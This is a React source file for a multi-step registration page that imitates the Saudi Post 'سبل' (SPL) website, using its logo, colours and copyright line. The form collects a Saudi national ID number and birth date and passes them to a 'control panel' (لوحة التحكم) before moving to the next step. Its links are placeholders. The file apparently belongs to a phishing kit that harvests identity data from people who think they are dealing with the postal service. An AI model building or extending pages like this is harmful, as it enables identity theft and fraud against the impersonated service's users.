import { useState } from "react";
import { Link, useLocation } from "wouter";
import { submitData } from "@/lib/store";

export default function RegisterStep2() {
  const [, setLocation] = useLocation();
  const [idNumber, setIdNumber] = useState("");
  const [calendarType, setCalendarType] = useState("gregorian");
  const [day, setDay] = useState("");
  const [month, setMonth] = useState("");
  const [year, setYear] = useState("");

  // Get account type from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const accountType = searchParams.get('type') || 'individuals';

  // Validation states
  const [formErrors, setFormErrors] = useState<string[]>([]);
  const [showErrors, setShowErrors] = useState(false);
  const [idError, setIdError] = useState("");

  // Luhn algorithm to validate Saudi ID number
  const validateSaudiIdWithLuhn = (id: string): boolean => {
    if (id.length !== 10) return false;
    
    let sum = 0;
    for (let i = 0; i < 10; i++) {
      let digit = parseInt(id[i], 10);
      
      // Double every second digit (odd positions in 0-indexed)
      if (i % 2 === 0) {
        digit *= 2;
        if (digit > 9) {
          digit = Math.floor(digit / 10) + (digit % 10);
        }
      }
      sum += digit;
    }
    
    return sum % 10 === 0;
  };

  // Validate Saudi ID number (starts with 1 or 2, 10 digits, passes Luhn check)
  const validateIdNumber = (id: string) => {
    if (!id.trim()) {
      return "رقم الهوية مطلوب";
    }
    if (!/^\d+$/.test(id)) {
      return "رقم الهوية يجب أن يحتوي على أرقام فقط";
    }
    if (id.length !== 10) {
      return "رقم الهوية يجب أن يتكون من 10 أرقام";
    }
    if (!id.startsWith('1') && !id.startsWith('2')) {
      return "رقم الهوية يجب أن يبدأ بـ 1 أو 2";
    }
    if (!validateSaudiIdWithLuhn(id)) {
      return "رقم الهوية غير صحيح";
    }
    return "";
  };

  const handleIdChange = (value: string) => {
    // Only allow numbers
    const numbersOnly = value.replace(/[^0-9]/g, '').slice(0, 10);
    setIdNumber(numbersOnly);
    
    // Clear error when typing
    if (idError) {
      setIdError("");
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate all fields
    const errors: string[] = [];
    
    // Validate ID number
    const idValidationError = validateIdNumber(idNumber);
    if (idValidationError) {
      errors.push(idValidationError);
      setIdError(idValidationError);
    }
    
    // Validate date fields
    if (!year) errors.push("السنة");
    if (!month) errors.push("الشهر");
    if (!day) errors.push("اليوم");
    
    if (errors.length > 0) {
      setFormErrors(errors);
      setShowErrors(true);
      return;
    }
    
    setShowErrors(false);
    
    // إرسال البيانات للوحة التحكم
    const months = calendarType === 'gregorian' ? 
      ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'] :
      ['محرم', 'صفر', 'ربيع الأول', 'ربيع الثاني', 'جمادى الأولى', 'جمادى الآخرة', 'رجب', 'شعبان', 'رمضان', 'شوال', 'ذو القعدة', 'ذو الحجة'];
    const monthName = months[parseInt(month) - 1] || month;
    
    submitData({
      'رقم الهوية': idNumber,
      'تاريخ الميلاد': `${day} ${monthName} ${year}`,
      'نوع التقويم': calendarType === 'gregorian' ? 'ميلادي' : 'هجري',
    });
    
    // Navigate to step 3 with account type
    setLocation(`/register-step3?type=${accountType}`);
  };

  // Generate days 1-31
  const days = Array.from({ length: 31 }, (_, i) => i + 1);
  
  // Generate months
  const gregorianMonths = [
    "يناير", "فبراير", "مارس", "أبريل", "مايو", "يونيو",
    "يوليو", "أغسطس", "سبتمبر", "أكتوبر", "نوفمبر", "ديسمبر"
  ];
  
  const hijriMonths = [
    "محرم", "صفر", "ربيع الأول", "ربيع الثاني", "جمادى الأولى", "جمادى الآخرة",
    "رجب", "شعبان", "رمضان", "شوال", "ذو القعدة", "ذو الحجة"
  ];

  // Generate years
  const currentYear = new Date().getFullYear();
  const gregorianYears = Array.from({ length: 100 }, (_, i) => currentYear - i);
  const hijriYears = Array.from({ length: 100 }, (_, i) => 1447 - i);

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
      {/* Header - dark green bar with English on left */}
      <header className="bg-[#143c3c] py-2">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            {/* Empty space on right */}
            <div></div>
            {/* English on left */}
            <a href="#" className="text-white text-xs md:text-sm hover:text-gray-300">English</a>
          </div>
        </div>
      </header>

      {/* Line below header */}
      <div className="h-1.5 md:h-2 bg-[#146c84]"></div>

      {/* Logo below header on right - aligned with form box */}
      <div className="bg-gray-100 py-3 md:py-4">
        <div className="container mx-auto px-4">
          <div className="max-w-xl mx-auto flex justify-start">
            <Link to="/">
              <img src="/images/spl-logo.png" alt="سبل" className="h-10 md:h-14 lg:h-16 w-auto" />
            </Link>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-3 md:px-4 py-4 md:py-8 lg:py-12">
        <div className="max-w-xl mx-auto">
          {/* White Box Container */}
          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-10">
            {/* Title */}
            <h1 className="text-xl md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-center mb-3 md:mb-4 lg:mb-6">
              من فضلك أدخل البيانات التالية
            </h1>

            {/* Subtitle */}
            <h2 className="text-base md:text-lg lg:text-xl text-gray-600 text-center mb-4 md:mb-6 lg:mb-8">
              أدخل البيانات الشخصية
            </h2>

            <form onSubmit={handleSubmit}>
              {/* ID Number Input */}
              <div className="mb-4 md:mb-6">
                <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">
                  رقم الهوية <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={idNumber}
                  onChange={(e) => handleIdChange(e.target.value)}
                  placeholder="رقم الهوية"
                  className={`w-full px-3 md:px-4 py-2.5 md:py-3 border rounded-lg text-right focus:outline-none text-sm md:text-base ${idError ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#146c84]'}`}
                />
                {idError && <p className="text-red-500 text-xs mt-1 text-right">{idError}</p>}
              </div>

              {/* Birth Date Section */}
              <h3 className="text-base md:text-lg font-bold text-[#143c3c] text-right mb-3 md:mb-4">
                تاريخ الميلاد <span className="text-red-500">*</span>
              </h3>

              {/* Calendar Type Selection */}
              <div className="space-y-2 md:space-y-3 mb-4 md:mb-6">
                {/* هجري */}
                <label className="flex items-center gap-2 cursor-pointer py-1">
                  <div className="relative">
                    <input
                      type="radio"
                      name="calendarType"
                      value="hijri"
                      checked={calendarType === "hijri"}
                      onChange={(e) => setCalendarType(e.target.value)}
                      className="sr-only"
                    />
                    <div className={`w-5 h-5 rounded-full border-2 ${calendarType === "hijri" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                      {calendarType === "hijri" && (
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                  <span className="text-gray-700 text-sm md:text-base">هجري</span>
                </label>

                {/* ميلادي */}
                <label className="flex items-center gap-2 cursor-pointer py-1">
                  <div className="relative">
                    <input
                      type="radio"
                      name="calendarType"
                      value="gregorian"
                      checked={calendarType === "gregorian"}
                      onChange={(e) => setCalendarType(e.target.value)}
                      className="sr-only"
                    />
                    <div className={`w-5 h-5 rounded-full border-2 ${calendarType === "gregorian" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                      {calendarType === "gregorian" && (
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                  <span className="text-gray-700 text-sm md:text-base">ميلادي</span>
                </label>
              </div>

              {/* Date Dropdowns */}
              <div className="grid grid-cols-3 gap-2 md:gap-3 mb-4 md:mb-6">
                {/* Year */}
                <div className="relative">
                  <select
                    value={year}
                    onChange={(e) => setYear(e.target.value)}
                    className="w-full px-2 md:px-3 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white text-xs md:text-sm"
                  >
                    <option value="">السنة</option>
                    {(calendarType === "gregorian" ? gregorianYears : hijriYears).map((y) => (
                      <option key={y} value={y}>{y}</option>
                    ))}
                  </select>
                  <div className="absolute left-2 md:left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
                    <svg className="w-3 h-3 md:w-4 md:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </div>

                {/* Month */}
                <div className="relative">
                  <select
                    value={month}
                    onChange={(e) => setMonth(e.target.value)}
                    className="w-full px-2 md:px-3 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white text-xs md:text-sm"
                  >
                    <option value="">الشهر</option>
                    {(calendarType === "gregorian" ? gregorianMonths : hijriMonths).map((m, index) => (
                      <option key={index} value={index + 1}>{m}</option>
                    ))}
                  </select>
                  <div className="absolute left-2 md:left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
                    <svg className="w-3 h-3 md:w-4 md:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </div>

                {/* Day */}
                <div className="relative">
                  <select
                    value={day}
                    onChange={(e) => setDay(e.target.value)}
                    className="w-full px-2 md:px-3 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right appearance-none focus:outline-none focus:border-[#146c84] bg-white text-xs md:text-sm"
                  >
                    <option value="">اليوم</option>
                    {days.map((d) => (
                      <option key={d} value={d}>{d}</option>
                    ))}
                  </select>
                  <div className="absolute left-2 md:left-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
                    <svg className="w-3 h-3 md:w-4 md:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </div>
              </div>

              {/* Error Messages */}
              {showErrors && formErrors.length > 0 && (
                <div className="mb-4 md:mb-6 p-3 md:p-4 bg-red-50 border border-red-300 rounded-lg">
                  <p className="text-red-600 font-bold mb-1.5 md:mb-2 text-right text-sm md:text-base">يرجى إكمال الحقول التالية:</p>
                  <ul className="list-disc list-inside text-red-500 text-xs md:text-sm text-right">
                    {formErrors.map((error, index) => (
                      <li key={index}>{error}</li>
                    ))}
                  </ul>
                </div>
              )}

              {/* Buttons */}
              <div className="flex flex-col-reverse sm:flex-row justify-between items-center gap-3 sm:gap-0">
                {/* Back Button */}
                <Link to="/register" className="w-full sm:w-auto">
                  <button
                    type="button"
                    className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 border-2 border-[#146c84] text-[#146c84] bg-white font-bold rounded-lg hover:bg-[#146c84] hover:text-white transition-colors text-sm md:text-base"
                  >
                    رجوع
                  </button>
                </Link>

                {/* Continue Button */}
                <button
                  type="submit"
                  className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                >
                  متابعة
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#143c3c] py-4 md:py-5 mt-auto">
        <div className="container mx-auto px-3 md:px-4">
          <div className="flex flex-col items-center gap-2 md:gap-0 md:flex-row md:justify-between text-white text-xs md:text-sm">
            {/* Right side - Copyright */}
            <div className="flex items-center gap-1 text-center md:text-right">
              <span>©</span>
              <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
            </div>
            
            {/* Left side - Terms and Privacy */}
            <div className="flex flex-wrap items-center justify-center gap-1 text-center">
              <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
              <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
              <span className="text-gray-300">و</span>
              <a href="#" className="text-[#04ccf0] hover:underline">سياسة الخصوصية</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
